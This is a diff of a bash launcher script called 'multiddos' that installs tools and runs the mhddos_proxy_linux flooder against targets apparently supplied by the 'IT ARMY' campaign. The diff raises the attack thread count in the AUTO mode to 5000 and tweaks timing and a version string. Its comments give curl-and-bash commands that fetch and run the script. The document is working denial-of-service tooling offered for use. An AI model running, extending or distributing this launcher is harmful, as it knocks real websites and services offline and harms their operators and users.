@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.2f\n"
+clear && echo -e "Loading... v1.2\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -64,7 +64,7 @@ toilet -t --metal "   жнець"
 toilet -t --metal " MULTIDDOS"
 
 if [[ $mhddos_mode == "new" ]]; then
-    typing_on_screen 'Шукаю завдання від IT ARMY...' && sleep 2
+    typing_on_screen 'Шукаю завдання від IT ARMY...' && sleep 1
 else
     typing_on_screen 'Шукаю завдання...' ; sleep 0.5
     echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
@@ -143,7 +143,7 @@ if [[ $mhddos_mode == "new" ]]; then
     chmod +x mhddos_proxy_linux
 
     if [[ $ddos_size == "AUTO" ]]; then
-        ./mhddos_proxy_linux --copies auto $args_to_pass
+        ./mhddos_proxy_linux --copies auto -t 5000 $args_to_pass
     elif [[ $ddos_size == "XS" ]]; then
         ./mhddos_proxy_linux -t 1000 $args_to_pass
     elif [[ $ddos_size == "S" ]]; then
